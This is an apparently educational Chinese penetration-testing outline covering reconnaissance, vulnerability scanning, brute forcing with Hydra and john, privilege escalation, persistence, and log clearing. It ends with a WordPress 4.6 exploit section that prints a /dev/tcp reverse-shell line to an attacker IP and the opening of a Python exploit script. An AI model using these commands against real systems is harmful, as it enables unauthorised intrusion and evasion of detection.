@[toc]
# 01-攻击流程

## 01-攻击流程

信息收集阶段->漏洞分析阶段->攻击阶段->后渗透阶段

## 02-信息收集

| ip资源          | 域名发现                 | 服务器信息收集   | 人力资源情报收集     | 网站关键信息识别 |
| --------------- | ------------------------ | ---------------- | -------------------- | ---------------- |
| 真实IP 获取     | 子域名信息收集           | 端口扫描         | whois信息            | 指纹识别         |
| 旁站信息收集    | 子域名枚举发现子域名     | 服务器版本识别   | 社会工程学           | 敏感路径探测     |
| C段主机信息收集 | 搜索引擎发现子域名       | 操作系统信息识别 | 利用客服进行信息收集 | 互联网信息收集   |
|                 | 第三方聚合服务发现子域名 |                  | 招聘信息收集         |                  |
|                 | 证书透明性信息发现子域名 |                  |                      |                  |
|                 | DNS域传送漏洞发现        |                  |                      |                  |

## 03-漏洞分析

- Exploit Database-利用数据库，收集了大量的漏洞以及漏洞利用程序
- Google hacking-利用google 搜索的语法进行精准的搜索
- Shodan-搜索连接到互联网的服务器、网络设备和摄像头等
- CVE/CNVD/CNNVD-搜索漏洞库，了解国内最新漏洞

## 04-攻击阶段

### 01-Web渗透测试

- CMS漏洞-WordPressCMS 漏洞、 DedeCMS 漏洞、Drupal 漏洞
- 框架漏洞-ThinkPHP框架漏洞、 Spring 框架漏洞、Struts2 框架漏洞
- Web TOP 10 漏洞-注入、文件上传、文件包含、命令执行、代码执行、XSS 、 SSRF 、 XXE 、反序列化、解析漏洞

### 02-权限提升

| Windows提权       | Linux提权        | 数据库提权            | 第三方提权       |
| ----------------- | ---------------- | --------------------- | ---------------- |
| 缓冲区溢出提权    | 内核漏洞提权     | SQL Server 数据库提权 | FTP软件提权      |
| 错误系统配置提权  | SUID提权         | MySQL UDF 提权        | 远程管理软件提权 |
| MSI文件提权       | 计划任务提权     | MySQL MOF 提权        |                  |
| 计划任务提权      | 环境变量劫持提权 | Oracle数据库提权      |                  |
| 启动项/组策略提权 |                  |                       |                  |
| 进程注入提权      |                  |                       |                  |

### 03-权限维持

| Windows权限维持 | Linux权限维持    | 渗透框架权限维持 | 其它方式维持   | 免杀技术      |
| --------------- | ---------------- | ---------------- | -------------- | ------------- |
| 隐藏系统用户    | sshd软连接       | Metasploit       | 远控NjRAT 木马 | 免杀工具      |
| shift 后门      | 启动项和计划任务 | Empire           | rootkit        | Cobalt Strike |
| 启动项          |                  | cobalt Strike    |                | Metasploit    |
| 计划任务        |                  |                  |                | 其他免杀方法  |
| 隐藏文件        |                  |                  |                |               |
| 创建服务        |                  |                  |                |               |

### 04-内网攻击

端口转发->反弹shell->代理客户端->隐秘隧道

| 中间人劫持攻击 | 网络设备漏洞 | 无线网攻击 | 操作系统漏洞  | 钓鱼攻击        |
| -------------- | ------------ | ---------- | ------------- | --------------- |
| Cookie会话劫持 | 路由器       | 无线网加密 | MS08-067 利用 | 邮件钓鱼        |
|                | 交换机       | 无线网破解 | MS17-010 利用 | CobalStrike钓鱼 |
|                |              |            |               | 重定向钓鱼      |

## 05-后渗透

| 敏感信息收集            | 本机信息收集 | 网络架构信息收集           | 域控攻击          | 域渗透/域控权限维持  |
| ----------------------- | ------------ | -------------------------- | ----------------- | -------------------- |
| 摄像头/LED 大屏信息收集 | 用户列表     | Netstat收集网络信息        | MS14-068攻击      | 黄金票据权限维持     |
| 共享目录信息收集        | 主机信息     | 路由表收集网络信息         | MS14-025攻击      | SSP权限维持          |
| 数据库信息收集          | 进程列表     | ICMP收集网络信息           | pass the key攻击  | 内存更新SSPs权限维持 |
| 高价值文档信息收集      | 端口列表     | Nbtscan收集网络信息        | pass the hash攻击 | GPO组策略权限维持    |
| 备份信息收集            | 补丁列表     | HOSTS文件收集网络信息      | ntml hash获取     |                      |
| SVN信息收集             | 用户习惯     | 登录日志收集网络信息       |                   |                      |
| Wiki信息收集            | 密码收集     | 代理服务器收集网络信息     |                   |                      |
| NFS信息收集             |              | 数据库配置文件收集网络信息 |                   |                      |

## 06-清除痕迹

| Windows日志痕迹清理    | Linux日志痕迹清理 | WEB日志痕迹清理     |
| ---------------------- | ----------------- | ------------------- |
| Metasploit 清除        | 历史记录清理      | Apache 日志痕迹清理 |
| Cobalt Strike 插件清理 | 日志清理          | IIS 日志痕迹清理    |

# 02-攻击路径

## 01-互联网 Web 应用系统攻击

- 访问网站
- 发现网站服务
- 查找cms相关漏洞
- 利用工具获取信息
- 查看是否可控
  - 是否存在文件上传点，文件名是否可控。
  - 是否存在备份数据库，数据库名是否可控。
  - 是否存在修改模板，修改内容是否可控。
  - 是否存在配置上传类型等选项。
  - 各种系统配置，如网站名、简介等。
- 获得网站控制权

## 02-互联网旁站攻击

- ip反查
  - 获取站点真实IP
  - 通过查询接口根据IP 反查绑定域名
  - 对旁站进行渗透并Getshell
  - 通过旁站的Shell 进行提权，获取服务器权限

## 03-互联网系统与服务攻击

### 01-常见服务端口号

| 端口号          | 端口服务/协议简要说明                 | 常见攻击手法                                                 |
| --------------- | ------------------------------------- | ------------------------------------------------------------ |
| TCP/20,21       | FTP-进行文件传输                      | 匿名上传下载文件、明文嗅探、弱口令暴力破解、VSFTP 后门、远程命令执行 |
| TCP/22          | SSH-linux 系统远程登录、 SSL 加密传输 | 弱口令暴力破解获得linux 系统远程登录权限                     |
| TCP/23          | Telnet-明文传输                       | 弱口令暴力破解、明文嗅探、交换机、路由器等设备远程登录权限   |
| TCP/25          | SMTP-简单邮件传输协议                 | 枚举邮箱用户、邮件伪造                                       |
| UDP/53          | DNS-域名解析                          | DNS劫持、域传送漏洞                                          |
| UDP/69          | TFTP-简单文件传输协议 文              | 文件下载                                                     |
| TCP/80,443,8080 | Web-常用 Web 服务端口                 | Web服务                                                      |
| TCP/110         | POP-邮局协议                          | 弱口令暴力破解、明文嗅探                                     |
| TCP/137,139,445 | Samba-Windows 和 Linux 间文件共享     | MS08-067 、 MS17-010 、弱口令暴力破解等                      |

### 02-常见端口

| TCP/1433 | MSSQL数据库         |
| -------- | ------------------- |
| TCP/1521 | Oracle数据库        |
| TCP/3306 | MySQL数据库         |
| TCP/3389 | Windows RDP远程桌面 |
| TCP/3690 | SVN服务             |
| TCP/5432 | PostgreSQL数据库    |

### 03-暴力破解

通过对公司外网IP的21 、 23 、 1433 、3389 、 8888 等端口进行暴力破解成功获得 3389 端口账号密码

### 04-远程连接桌面

通过上面暴力破解获取的用户名密码信息，连入远程桌面，这样就获取到了目标服务器的控制权

## 04-移动 APP 应用攻击

### Activity 公开组件暴露漏洞

利用反编译工具判断是否存在Activity 组件暴露的漏洞，反编译完成后发现 PWList Activity 的【 android:exported 】设置为了 true说明 PWList 这个 Activity 允许被外部程序调用，就可以利用此漏洞，对此 Activity 进行直接调用绕过了密码的验证，登录到了 APP 应用的后台页面，利用工具绕过密码验证，启动此Activity 组件

```bash
adb shell am start a action n com.mwr.example.sieve com.mwr.example.sieve.PWList
```

APP应用的功能与 APP 应用服务器的接口也可能会有交互，通过接口进行渗透也是常见的攻击方式。

## 05-社会工程学攻击

| 人员伪装 | 钓鱼短信     | 互联网公开信息检索 | 钓鱼WIFI | 钓鱼邮件     |
| -------- | ------------ | ------------------ | -------- | ------------ |
| 伪造工牌 | 中将短信     | 社工库检索         | 伪造WIFI | 广撒网式钓鱼 |
| 拨打电话 | 换号诈骗     | 搜索引擎检索       | WIFI攻击 | 鱼叉式钓鱼   |
|          | 伪装熟人短信 |                    |          | 水坑式钓鱼   |
|          |              |                    |          | 捕鲸式攻击   |

## 06-近源攻击

| ZigBee攻击     | 蓝牙攻击     | WIFI安全     | 物理攻击 | 人机接口攻击 |
| -------------- | ------------ | ------------ | -------- | ------------ |
| ZigBee攻击     | 蓝牙重放攻击 | 无线WIFI攻击 | 门锁攻击 | BadUSB       |
| ZigBee密钥攻击 | 蓝牙DDoS攻击 | WIFI钓鱼     | Hid攻击  | 键盘记录器   |
|                | 蓝牙MITM攻击 | 无人机攻击   |          | HDMI嗅探     |
|                | 蓝牙数据嗅探 | 无线设备攻击 |          |              |

## 07-供应链攻击

Xcode恶意代码植入

# 03-信息收集-IP资源

## 01-真实 IP 获取

### 01-CDN技术

为了保证网络的稳定和快速传输，网站服务商会在网络的不同位置设置节点服务器，通过CDN(内容分发网络)技术，将网络请求分发到最优的节点服务器上面。

### 02-判断CDN

- [站长工具](http://ping.chinaz.com)

- [爱站网](https://ping.aizhan.com)

- nslookup

  - 无CDN

    ```bash
    abc.com
    服务器: public1 .114dns.com
    Address: 114.114.114.114
    非权威应答:
    名称: abc.com
    Address: 192.12.168.172
    ```

  - 有CDN

    ```bash
    www .abc.com
    服务器: public1 .114dns.com
    Address: 114.114.114.114
    非权威应答:
    名称: abc.xdwscache.ourglb0.com
    Addresses: 58.223.164.86
    			125.75.32.252
    Aliases: www .abc.com
    		www.abc.com.lxdns.com
    ```

### 03-绕过CDN 获取真实 IP

#### 01-查询子域名

子域名可能跟主站在同一个服务器或者同一个 C 段网络中，可以通过子域名探测的方式，收集目标的子域名信息，通过查询子域名的 IP 信息来辅助判断主站的真实 IP 信息。

#### 02-查询历史DNS 记录

微步在线查询的【 www.***.com 】这个域名的历史 DNS 解析信息，然后分析哪些 IP 不在现在的 CDN 解析 IP 里面，就有可能是之前没有加 CDN 加速时的真实 IP

#### 03-使用国外主机解析域名

探测的方式也有两种，一种是利用自己已有的国外的主机直接进行探测，另一种如果没有国外主机可以利用公开的多地 ping 服务，多地 ping 服务有国外的探测节点，可以利用国外节点的返回信息来判断真实的 IP 信息。

#### 04-网站漏洞

利用网站存在的漏洞，信息泄露的敏感信息、文件，如 phpinfo文件、网站源码文件、Github 泄露的信息等都可能会将真实的 IP 信息泄露。

#### 05-邮件信息

邮件的信息中会记录邮件服务器的IP 信息，有些站点有类似于 RSS 邮件订阅可以发送邮件的功能，可以利用其发送的邮件，通过查看源码的方式查看真实服务器的 IP 信息。

## 02-旁站信息收集

旁站是与攻击目标在同一服务器上的不同网站，当攻击目标没有漏洞的情况下，可以通过查找旁站的漏洞，通过攻击旁站，然后再通过提权拿到服务器的最高权限 。

### 01-nmap功能

- 扫描主机端口，嗅探所提供的网络服务
- 探测一组主机是否在线
- 推断主机所用的操作系统

### 02-nmap作用

- 探测目标主机所开放的端口
- 通过识别新的服务器审计网络的安全性
- 探测网络上的主机
- 通过对设备或者防火墙的探测来审计它的安全性

### 03-全端口扫描

```bash
root@kali:~#nmap -sV -p 1-65535 192.168.88.21
```

### 04-第三方服务获取旁站信息

- [同IP 网站查询](http://stool.chinaz.com/same)
- Bing搜索

## 03-C 段主机信息收集

### 01-Nmap扫描

```bash
root@kali:~#nmap -sn 192.168.88.21/24
```

### 02-搜索引擎

在Google 搜索引擎中输入`site:61.x.162.*`

# 04-信息收集-服务器与人力资源情报收集

## 01-nmap

- Nmap进行指纹识别的参数`-sV`
- Nmap使用`-O`参数来启动操作系统检测

## 02-Whois 信息

- [站长之家](https://tool.chinaz.com/ipwhois)
- [who.is](https://who.is)
- [bugscaner](http://whois.bugscaner.com)

## 03-社会工程学

- 信息刺探
  1. 善用你身边的信息
  2. 学习侦探的伪装
  3. 人性的弱点
  4. 组织信息构造陷阱
- 心理学的应用
  - 冒用身份
  - 行为模仿
  - NPL内心存储记忆
- 反查技术
  - 在攻击中最重要的一部分不是成功侵入主机，而是清除痕迹，不要让管理者发现被侵入及数据被伪造。

## 04-利用招聘信息&客服进行信息收集

- 招聘网站信息收集
- 通过客服植入木马
- 官方联系方式招聘网站信息收集

# 05-信息收集-网站关键信息收集

## 01-指纹识别

| CMS信息 | 前端技术  | Web服务器 | WAF信息 | 开发语言 | 操作系统 |
| ------- | --------- | --------- | ------- | -------- | -------- |
| 织梦CMS | HTML5     | Apache    | Yundun  | PHP      | Kali     |
| 大汉CMS | jquery    | Tomcat    | Topsec  | JAVA     | Centos   |
| 帝国CMS | bootstrap | Nginx     | 安全狗  | Python   | Win7     |
| PhpCMS  | Prue      | IIS       |         | Ruby     | Ubuntu   |
| Ecshop  | Ace       | Jboss     |         | C#       | Win2003  |

### 01-特定关键字识别

- 访问网站的首页，从返回的信息Powered by DedeCMS
- 通过meta 标签中的 content 字段识别 WordPress 

### 02-特定文件及路径识别

- CMS会有一些 JS 、 CSS 、图片等静态文件，这些文件一般不会变化，可以利用这些特定文件的 MD5 值作为指纹信息来判断 CMS 的类型 。
- 不同的CMS 会有不同网站结构， WordPress 会有特定的文件路径`/wp-admin`，WordPress 和 DedeCMS 的`robots.txt`文件可能包含了 CMS 特定的文件路径，与扫描工具数据库存储的指纹信息进行正则匹配判断 CMS 的类型。

### 03-响应头信息识别

应用程序会在响应头Server 、 X Powered By 、 Set Cookie 等字段中返回 Banner 信息或者自定义的数据字段，通过响应头返回的信息，可以对应用进行识别，WAF 设备也可以通过响应头信息进行识别判断。当然应用程序可以自定义自己的 Banner 信息。

## 02-指纹识别工具

- whatweb
  - 常规扫描-whatweb 域名/ip地址
  - 批量扫描-whatweb -i 含有需要扫描的域名的文件的路径
  - 详细回显扫描-whatweb -v 域名
  - 本地扫描-whatweb --no-errors -t 255 内网网段
  - 扫描强度等级控制-whatweb -a 3 域名（只有1 3 两个级别）
  - 扫描结果导出文件-whatweb --log-xml= testfire.xml
- Wappalyzer
- Whatruns
- [W11scan](https://github.com/hannoch/w11scan)
- [云悉指纹识别](https://www.yunsee.cn/)

## 03-敏感路径探测

通过敏感路径探测可以获取很多由于错误配置泄露的文件、默认文件、测试文件、备份文件等，这些文件里面可能存在了很多数据库配置、应用程序配置等敏感信息。

- 使用BurpSuite 可以扫描目录， BurpSuite 有Intruder 模块，将抓到的数据包的路径设置为变量，将目录文件的字典添加为 Payload ，然后不断遍历达到目录暴力破解的目的。
- 将目录文件的字典添加为Payload ，注意将【 Payload Encoding 】去掉对勾，否则可能会将Payload 的 等特殊字符进行 URL 编码。
- 遍历完成字典中的路径后，对状态进行排序，状态码是 200 和 301 都是真实存在的路径 。

## 04-互联网信息收集

### 01-历史漏洞信息收集

ZoomEye给出各大组件、服务器系统等存在的历史性漏洞的描述文档

### 02-SVN代码泄漏

【.svn 】的【 pristine 】文件夹里包含了整个项目的所有文件备份。若发布代码时直接将整个项目拷贝到了网站根目录，并且没有删掉隐藏的【 svn 】文件，或是直接使用【 Checkout 】将项目拉到网站根目录发布站点，然后没有删除隐藏的【 .svn 】文件，将会导致 SVN代码泄露。

### 03-GIT代码泄漏使用

GIT也是一个版本控制软件 。使用工具 GitHack 利用 GIT 代码泄漏

### 04-网盘信息收集

为了文件的传输方便将代码或者其他含有敏感信息的文件传输到网盘中，如果将网盘中的文件进行了无密码分享或者网盘本身存在漏洞再或者是网盘的密码泄露，[网站1](http://hao.misiai.com)，[网站2](https://search.chongbuluo.com)

# 06-信息收集-域名发现

## 01-子域名信息收集

子域名是在域名系统等级中，属于更高一层域的域。比如， mail.example.com 和 calendar.example.com是 example.com 的两个子域。

- .ac用于科研机构
- .com用于工商金融企业
- .net用于互联网络信息中心和运行中心
- .org用于非营利组织

## 02-子域名枚举发现子域名

- Layer子域名挖掘机
- SubDomainsBrute
- DNSRecon
- Subbrute
- Recon-Ng
- Fierce
- Gobuster

## 03-搜索引擎发现子域名

> 搜索语法:site:xxx.com
>
> - google
> - baidu
> - bing
> - yahoo

## 04-第三方聚合服务发现子域名

很多公开的第三方聚合服务网站都可以进行信息收集，子域名信息是其包含的内容之一 。

- [DNSdumpster](https://dnsdumpster.com/)
- [VirusTotal](https://www.virustotal.com/gui/home/search)
- Sublist3r

## 05-证书透明性信息发现子域名

是Google的公开项目，旨在通过让域所有者、 CA 和域用户对 SSL 证书的发行和存在进行审查，来纠正这些基于证书的威胁，在`https:// transparencyreport.google.com /https/certificates`中输入`***.com`进行搜索

## 06-DNS域传送漏洞发现子域名

- 主DNS 服务器
  - 主要维护所负责解析的域数据库的 DNS 服务器，可以对数据库进行读写操作，数据库中存储了主机名相关的信息，需要管理员手工进行修改。
- 从DNS 服务器
  - 作为主 DNS 服务器的备份服务器与负载服务器。
- 缓存DNS 服务器
  - 不负责域名解析，它会将用户访问其他 DNS 的信息保存在本地，作为缓存数据，这样用户再访问时就会比较方便，缩短域名的查询时间。
- 转发DNS 服务器
  - 将特定的域名查询进行转发转发 DNS 服务器会转发到指定的 DNS 服务器上面由此台指定的 DNS 服务器完成域名解析的工作 。

1. 在kali中使用`dig xxx.com ns`命令对目标发送一个 ns 类的解析请求判断其 dns 服务器。
2. 对目标发起axfr 请求成功获取到其域内的所有域名`dig axfr @dns xxx.com`。

# 07-漏洞分析-Web漏洞扫描

## 01-AWVS 扫描器

AWVS是一个自动化的 web 漏洞扫描工具，它通过跟踪网站上所有链接来分析整个网站，然后对网站对每个部分进行针对性检测 。

- 仪表盘
- 目标主机
- 漏洞
- 扫描
- 报告书

## 02-AWVS 配置

输入描述来识别目标。完成后点击添加目标，然后将被带到目标的选项，可以根据业务的情况配置扫描强度、扫描速度 和 AcuSensor 。

进行交互式应用程序安全测试-IAST。启用AcuSensor 后，传感器会检索所有文件，包括无法通过网站链接访问的文件，然后扫描程序会模拟黑客对每个页面进行测试，分析每个页面可输入数据的位置。

启用连续扫描，会每天对目标进行快速扫描，并且每周会进行一次完整扫描。

扫描程序将自动检测登录链接、注销链接和用于维护会话活动的机制，自动登录站点。带有验证码等的复杂登录机制的，则需要配置使用预先录制的登入序列 。

# 08-漏洞分析-漏洞研究

## 01-Google hacking

### 01-常见Google 搜索语法

| AND与+              | 搜索结果要求包含两个或者两个以上的关键字 |
| ------------------- | ---------------------------------------- |
| NOT与-              | 逻辑非，减号后是要排除的关键字           |
| "关键词"            | 完全匹配                                 |
| site:域名           | 指定搜索的域名                           |
| inurl与allinurl     | 搜索url 中包含关键字的网页               |
| intitle与allintitle | 搜索页面标题中包含关键字的网页           |
| intext与allintext   | 搜索网页内容中包含关键字的网页           |
| filetype与ext       | 搜索指定类型的文件                       |
| link                | 搜索所有链接到某个url 地址的网页         |
| cache               | 从google 缓存中搜索                      |

### 02-配置文件搜索示例filetype

| PHP配置文件                  | 防火墙配置文件 | FTP配置文件        | SSL配置文件    | MySQL配置文件   | IIS Web 配置文件    |
| ---------------------------- | -------------- | ------------------ | -------------- | --------------- | ------------------- |
| intitle:index.of config.php  | filetype:conf  | filetype:conf      | inurl:ssl.conf | filetype:cnf    | filetype:config     |
| inurl:dbuname dbpass php.ini | inurl:firewall | inurl:proftpd.conf | filtype:conf   | filetype:my.cnf | filetype:web.config |
| filetype:ini                 | intitle:cvs    |                    |                |                 |                     |

### 03-搜索管理后台

通常管理后台的url会包含admin、login、admin_login、manage、system或console等关键字，通过inurl搜索包含上述关键字的url来定位管理后台。

### 04-搜索错误配置

通常网站标题中会包含index of 关键字，因此可以使用 intitle 搜索网站标题包含 index of关键字的网站来搜索存在目录浏览漏洞的站点，若想仅搜索某一站点是否存在目录浏览漏洞，可以通过 site 指定搜索的域名 。

### 05-搜索敏感文件

利用google 搜索的语法可以还可以快速搜索敏感文件，例如网站的备份文件通常是bak 后缀，对于 php 站点可以通过inurl 搜索后缀为 php.bak 的文件 。

## 02-Exploit Database

### 01-四大功能

- Exploits-提供大量的漏洞利用程序
- GHDB-提供大量的Google hacking 语法
- Shellcodes-用来发送到服务器利用特定漏洞的代码
- Papers-大量安全相关论文、白皮书等文章

### 02-type

- dos-用于拒绝服务攻击的漏洞利用程序
- local-本地漏洞利用程序
- remote-远程漏洞利用程序
- webapps-web应用的漏洞利用程序

## 03-CVE/CNVD/CNNVD

- [cve](https://cve.mitre.org)
- [nvd](https://nvd.nist.gov/)
- [cnvd](https://www.cnvd.org.cn)
- [cnnvd](http://www.cnnvd.org.cn)

# 09-漏洞分析-弱口令扫描

## 01-通用默认口令

- Weblogic
  - 用户名：weblogic 、 system 、 admin 、 WebLogic
  - 密码：weblogic 、 weblogic123 、 WebLogic
- MySQL
  - 用户名/密码：admin/admin 、 root/root
- FTP通用/默认弱口令
  - 用户名：anonymous 、 user 、 ftp 、 root
  - 密码：anonymous 、 user 、 ftp 、 root
- Tomcat
  - 用户名：admin 、 manager 、 role1 、 tomcat 、both
  - 密码：admin 、 manager 、 role1 、 tomcat 、 both

## 02-Hydra 暴力破解

爆破神器，可以对多种服务的账号和密码进行爆破

```bash
F:\CTF\字典\爆破\hydra>hydra.exe -h
Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Options:
  -s PORT(指定非默认端口)   if the service is on a different default port, define it here
  -l LOGIN(登录名) or -L FILE(登录名字典)  login with LOGIN name, or load several logins from FILE
  -p PASS(密码破解)  or -P FILE(密码字典破解)  try password PASS, or load several passwords from FILE
  -C FILE(用户名密码字典,格式：用户名：密码)   colon separated "login:pass" format, instead of -L/-P options
  -M FILE(目标列表文件)   list of servers to attack, one entry per line, ':' to specify port
  -t TASKS(指定爆破时的任务数量默认为16)  run TASKS number of connects in parallel (per host, default: 16)
  
Examples:
  hydra -l user -p root ssh://192.168.0.1
  hydra -l user -P '/root/password.txt' mysql://192.168.0.1
  hydra -L 'userlist.txt' -P '/root/password.txt'  ftp://192.168.0.1
  hydra -C defaults.txt -e n -M '/host.txt' smb(暴力破解SMB)
```

## 03-Metasploit 暴力破解

### 01-SSH暴力破解

使用【 auxiliary/scanner/ ssh ssh_login 】模块，设置暴破的目标地址，选择用户名和密码字典，设置暴破线程等相关参数，run命令进行暴力破解。

### 02-john破解

需要先得到/etc/shadow文件

```bash
root@kali:/etc# john shadow
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
root             (root)
1g 0:00:00:00 DONE 1/3 (2021-05-25 16:52) 9.090g/s 145.4p/s 145.4c/s 145.4C/s root..root4
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

# 10-漏洞分析-系统漏洞扫描

## 01-Nessus 系统扫描器

| 模块                                                  | 说明                                                         |
| ----------------------------------------------------- | ------------------------------------------------------------ |
| Advanced Dynamic Scan-高级动态扫描                    | 可以针对特定的漏洞定制扫描，通过配置一个动态的插件过滤器来代替手动选择插件，并且当插件发生变化时，根据过滤器动态地包含或者排除插件 |
| Advanced Scan-高级扫描                                | 不使用默认配置扫描                                           |
| Basic Network Scan-基本网络扫描                       | 对主机进行全面的系统扫描                                     |
| Badlock Detection-检测Badlock                         | 远程和本地检查CVE-2016-2118 和 CVE-2016-0128                 |
| Bash Shellshock Detection-检测Bash 的 Shellshock 漏洞 | 远程和本地检查CVE-2014-6271 和 CVE-2014-7169                 |
| Credentialed Patch Audit-授权的补丁审计               | 对主机进行身份验证并枚举缺少的更新                           |
| DROWN Detection-检测DROWN                             | 远程检查CVE-2016-0800                                        |
| Intel AMT Security Bypass                             | 远程和本地检查CVE-2017-5689                                  |
| Malware Scan-恶意软件扫描 扫描                        | Windows 和 Unix 系统上的恶意软件                             |
| Mobile Device Scan-移动设备扫描                       | 通过Microsoft Exchange 或 MDM 评估移动设备                   |
| Shadow Brokers Scan-Shadow Brokers扫描                | 扫描Shadow Brokers 黑客组织公开的漏洞                        |
| Spectre and Meltdown                                  | 远程和本地检查CVE-2017-5753 、 CVE-2017-5715 和 CVE-2017-5754 |
| WannaCry Ransomware-Wannacry勒索软件                  | 扫描WannaCry 勒索软件                                        |
| Web Application Tests-Web应用系统测试                 | 扫描公开的和未知的网络漏洞                                   |

## 02-Nessus 分析扫描结果

配置基本信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190723161349584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d3bDAxMjM0NQ==,size_16,color_FFFFFF,t_70)

设置进度日程

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190723161837814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d3bDAxMjM0NQ==,size_16,color_FFFFFF,t_70)

配置端口扫描

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190723162822589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d3bDAxMjM0NQ==,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190723163416152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d3bDAxMjM0NQ==,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/2019072316403222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d3bDAxMjM0NQ==,size_16,color_FFFFFF,t_70)

评估设置

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190723164358559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d3bDAxMjM0NQ==,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190723165236666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d3bDAxMjM0NQ==,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190723173310759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d3bDAxMjM0NQ==,size_16,color_FFFFFF,t_70)

# 11-web渗透测试-CMS漏洞

## 01-WordPress CMS 漏洞

WordPress是使用 PHP 语言开发的博客平台，用户可以在支持 PHP 和 MySQL 数据库的服务器上架设属于自己的网站。

### 01-WordPress 5.0远程代码执行漏洞

- 影响版本WordPress <= 5.0.0
- Rips在博客上披露了 WordPress 远程代码执行漏洞
- 设计缺陷：导致存在目录遍历以及本地文件包含漏洞
- 核心问题：PostMeta可以被覆盖、路径穿越、本地文件包含
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629171412425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MTYxNjU4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629171422323.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MTYxNjU4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629171443147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MTYxNjU4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021062917145428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MTYxNjU4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629171505112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MTYxNjU4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021062917152137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MTYxNjU4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629171534996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MTYxNjU4,size_16,color_FFFFFF,t_70#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629171735227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MTYxNjU4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629171757280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MTYxNjU4,size_16,color_FFFFFF,t_70#pic_center)
### 02-WordPress4.6远程代码执行漏洞

配置好将shell.sh 文件放入自己的服务器

```bash
root@kail:/var/ww/html/# cat shell.sh
0<139-;exec 139<>/dev/tcp/192.168.86.200/1995;sh <&139 >&139
```

将自己服务器中的shell.sh 放入目标服务器
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629171828813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MTYxNjU4,size_16,color_FFFFFF,t_70#pic_center)

创建 exp，漏洞利用头部的字段注入了恶意的Payload 数据，并进入 mail 函数，再利用【 sendmail 】命令的【 be 】参数进行命令的执行

```python
#!/usr/bin/env python3
import requests
import sys

# wordpress's url
target = 'http://192.168.0.142' if len(sys.argv) < 1 else sys.argv[1]
